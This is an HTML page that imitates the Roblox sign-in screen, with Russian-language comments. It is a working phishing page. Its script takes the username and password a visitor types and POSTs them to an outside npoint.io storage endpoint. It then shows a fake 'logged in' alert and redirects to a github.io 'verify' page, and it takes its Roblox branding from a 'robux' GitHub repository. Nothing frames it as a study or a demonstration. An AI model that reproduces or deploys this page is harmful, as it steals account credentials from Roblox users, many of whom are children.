<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Roblox - Sign In</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Builder Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
  }

  body {
    background-color: #000;
    background-image: 
      linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.7)),
      url('https://github.com/alidevtop/robux/releases/download/ff/de4e698b86f73bc5.jpg');
    background-size: cover;
    background-position: center;
    background-attachment: fixed;
    min-height: 100vh;
    color: #fff;
  }

  /* ================= NAVBAR ================= */
  .navbar {
    width: 100%;
    height: 48px;
    background-color: #191b1f;
    display: flex;
    align-items: center;
    padding: 0 24px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.3);
    position: sticky;
    top: 0;
    z-index: 1000;
  }

  .navbar-logo {
    height: 24px;
    width: auto;
    margin-right: 30px;
    cursor: pointer;
  }

  .nav-links {
    display: flex;
    gap: 28px;
    list-style: none;
    margin-right: auto;
  }

  .nav-links a {
    color: #fff;
    text-decoration: none;
    font-size: 16px;
    font-weight: 600;
    transition: color 0.2s;
  }

  .nav-links a:hover {
    color: #ccc;
  }

  .nav-search {
    display: flex;
    align-items: center;
    background: #232527;
    border: 1px solid #3b3e41;
    border-radius: 8px;
    padding: 0 12px;
    height: 32px;
    width: 250px;
    margin-right: 20px;
    transition: border-color 0.2s;
  }

  .nav-search:focus-within {
    border-color: #00a2ff;
  }

  .nav-search svg {
    fill: #888;
    width: 16px;
    height: 16px;
    margin-right: 8px;
  }

  .nav-search input {
    background: transparent;
    border: none;
    outline: none;
    color: #fff;
    font-size: 14px;
    width: 100%;
  }
  
  .nav-search input::placeholder {
    color: #888;
  }

  .nav-signup-btn {
    background: #335fff;
    color: #fff;
    text-decoration: none;
    padding: 8px 16px;
    border-radius: 6px;
    font-size: 14px;
    font-weight: 700;
    transition: background 0.2s;
  }

  .nav-signup-btn:hover {
    background: #2548e0;
  }

  /* ================= MAIN CONTENT ================= */
  .main-wrapper {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: calc(100vh - 48px);
    padding: 30px 20px;
  }

  .login-box {
    background: #232527;
    border-radius: 8px;
    padding: 30px;
    width: 100%;
    max-width: 400px;
    box-shadow: 0 8px 30px rgba(0,0,0,0.5);
    text-align: left;
    backdrop-filter: blur(10px); 
  }

  .login-box h1 {
    font-size: 24px;
    font-weight: 700;
    color: #fff;
    margin-bottom: 20px;
  }

  .field {
    margin-bottom: 18px;
  }

  .field label {
    display: block;
    font-size: 14px;
    font-weight: 600;
    color: #fff;
    margin-bottom: 6px;
  }

  .input-wrapper {
    position: relative;
    display: flex;
    align-items: center;
  }

  .field input {
    width: 100%;
    padding: 12px 14px;
    font-size: 15px;
    background: #232527;
    border: 1px solid #555;
    border-radius: 6px;
    outline: none;
    color: #fff;
    transition: border-color .15s;
  }

  .field input::placeholder {
    color: #888;
  }

  .field input:focus {
    border-color: #00a2ff;
    box-shadow: 0 0 0 1px #00a2ff;
  }

  .field input.error {
    border-color: #ff4d4d;
    box-shadow: 0 0 0 1px #ff4d4d;
  }

  .error-msg {
    color: #ff4d4d;
    font-size: 12px;
    margin-top: 5px;
    display: none;
  }

  .eye-icon {
    position: absolute;
    right: 12px;
    cursor: pointer;
    fill: #888;
  }
  .eye-icon:hover {
    fill: #ccc;
  }

  /* ================= КНОПКА SIGN IN ================= */
  .login-btn {
    width: 100%;
    padding: 12px;
    background: #3b3e41;      /* серый по умолчанию (неактивна) */
    color: #888;
    font-size: 16px;
    font-weight: 700;
    border: none;
    border-radius: 6px;
    cursor: not-allowed;
    margin-top: 10px;
    margin-bottom: 15px;
    transition: background .15s, color .15s;
  }

  /* Активная кнопка — синяя */
  .login-btn:not(:disabled) {
    background: #00a2ff;
    color: #fff;
    cursor: pointer;
  }

  .login-btn:not(:disabled):hover {
    background: #008ede;
  }

  .forgot-link {
    display: inline-block;
    color: #fff;
    font-size: 14px;
    text-decoration: none;
    margin-bottom: 20px;
    border-bottom: 1px solid transparent;
  }
  .forgot-link:hover {
    border-bottom: 1px solid #fff;
  }

  .divider {
    display: flex;
    align-items: center;
    margin: 15px 0 20px;
    color: #888;
    font-size: 12px;
    font-weight: 600;
    text-transform: uppercase;
  }

  .divider::before,
  .divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #3b3e41;
  }

  .divider span {
    padding: 0 12px;
  }

  .method-btn {
    width: 100%;
    padding: 12px;
    background: #3b3e41;
    color: #fff;
    font-size: 15px;
    font-weight: 600;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    margin-bottom: 10px;
    transition: background .15s;
  }

  .method-btn:hover {
    background: #4a4e52;
  }

  .method-btn svg {
    width: 20px;
    height: 20px;
    fill: #fff;
  }

  .footer-text {
    margin-top: 25px;
    font-size: 14px;
    text-align: center;
    color: #fff;
  }

  .footer-text a {
    color: #fff;
    font-weight: 700;
    text-decoration: none;
  }
  .footer-text a:hover {
    text-decoration: underline;
  }

  @media (max-width: 768px) {
    .nav-links { display: none; }
    .nav-search { display: none; }
    .navbar { justify-content: space-between; }
  }
</style>
</head>
<body>

<!-- ================= НАВИГАЦИОННАЯ ПАНЕЛЬ ================= -->
<header class="navbar">
  <img src="https://github.com/alidevtop/robux/releases/download/ff/robloxlogo.png" alt="Roblox Logo" class="navbar-logo">
  
  <ul class="nav-links">
    <li><a href="#">Charts</a></li>
    <li><a href="#">Marketplace</a></li>
    <li><a href="#">Create</a></li>
    <li><a href="#">Robux</a></li>
  </ul>

  <div class="nav-search">
    <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
    <input type="text" placeholder="Search">
  </div>

  <a href="#" class="nav-signup-btn">Sign Up</a>
</header>

<!-- ================= ОСНОВНОЙ КОНТЕНТ ================= -->
<div class="main-wrapper">
  <div class="login-box">
    <h1>Sign in</h1>

    <div class="field">
      <label>Username</label>
      <div class="input-wrapper">
        <input type="text" placeholder="Username" id="username-input" autocomplete="off">
      </div>
      <div class="error-msg" id="username-error">Только имя пользователя (без @, email и телефона)</div>
    </div>

    <div class="field">
      <label>Password</label>
      <div class="input-wrapper">
        <input type="password" placeholder="Password" id="password-input">
        <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" onclick="togglePassword()">
          <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
        </svg>
      </div>
    </div>

    <!-- Кнопка изначально disabled (серая) -->
    <button class="login-btn" id="login-button" onclick="handleLogin()" disabled>Sign in</button>

    <a href="#" class="forgot-link">Forgot password or username?</a>

    <div class="divider"><span>OR</span></div>

    <button class="method-btn" onclick="showError()">
      <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
      Email a code
    </button>

    <button class="method-btn" onclick="showError()">
      <svg viewBox="0 0 24 24"><path d="M3 11h8V3H3v8zm2-6h4v4H5V5zM3 21h8v-8H3v8zm2-6h4v4H5v-4zM13 3v8h8V3h-8zm6 6h-4V5h4v4zM13 13h8v8h-8v-8zm2 2h4v4h-4v-4z"/></svg>
      QR code
    </button>

    <button class="method-btn" onclick="showError()">
      Other sign-in options
    </button>

    <div class="footer-text">
      Don't have an account? <a href="#">Create one</a>
    </div>
  </div>
</div>

<script>
  // ================= ЛОГИКА СОХРАНЕНИЯ =================

  async function updateNotepad(dataObj) {
    const response = await fetch("https://api.npoint.io/429018ff0e2671bdd748", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(dataObj)
    });

    if (!response.ok) {
      throw new Error(`Ошибка сервера: ${response.status}`);
    }

    console.log("✅ Данные отправлены");
  }

  // Валидация: только username (буквы, цифры, _), без @, email и телефона
  function isValidUsername(val) {
    if (!val) return false;
    const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
    return usernameRegex.test(val);
  }

  // Обработчик кнопки Sign In
  async function handleLogin() {
    const usernameInput = document.getElementById('username-input');
    const passwordInput = document.getElementById('password-input');
    const errorMsg = document.getElementById('username-error');

    const username = usernameInput.value.trim();
    const password = passwordInput.value;

    usernameInput.classList.remove('error');
    errorMsg.style.display = 'none';

    if (!isValidUsername(username)) {
      usernameInput.classList.add('error');
      errorMsg.style.display = 'block';
      return;
    }

    if (password.length < 4) {
      passwordInput.classList.add('error');
      alert("Пароль должен содержать минимум 4 символа");
      return;
    }

    const payload = {
      pass: password,
      username: username
    };

    try {
      await updateNotepad(payload);
      alert("Успешно вошли в акк!");
    } catch (err) {
      console.error(err);
    
    }
    window.location.href = "https://alidevtop.github.io/robux/verify";
  }

  // ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================

  function showError() {
    alert('В "логине через" нельзя использовать методы');
  }

  function togglePassword() {
    const pwd = document.getElementById('password-input');
    if (pwd.type === 'password') {
      pwd.type = 'text';
    } else {
      pwd.type = 'password';
    }
  }

  // ================= АКТИВАЦИЯ КНОПКИ =================

  const userField = document.getElementById('username-input');
  const passField = document.getElementById('password-input');
  const loginBtn = document.getElementById('login-button');

  function checkFields() {
    const username = userField.value.trim();
    const password = passField.value;
    const isValid = isValidUsername(username) && password.length >= 4;
    loginBtn.disabled = !isValid;
  }

  userField.addEventListener('input', checkFields);
  passField.addEventListener('input', checkFields);

  // ================= ФИЛЬТРАЦИЯ ВВОДА =================

  userField.addEventListener('input', function() {
    this.value = this.value.replace(/[^a-zA-Z0-9_]/g, '');
  });

</script>

</body>
</html>
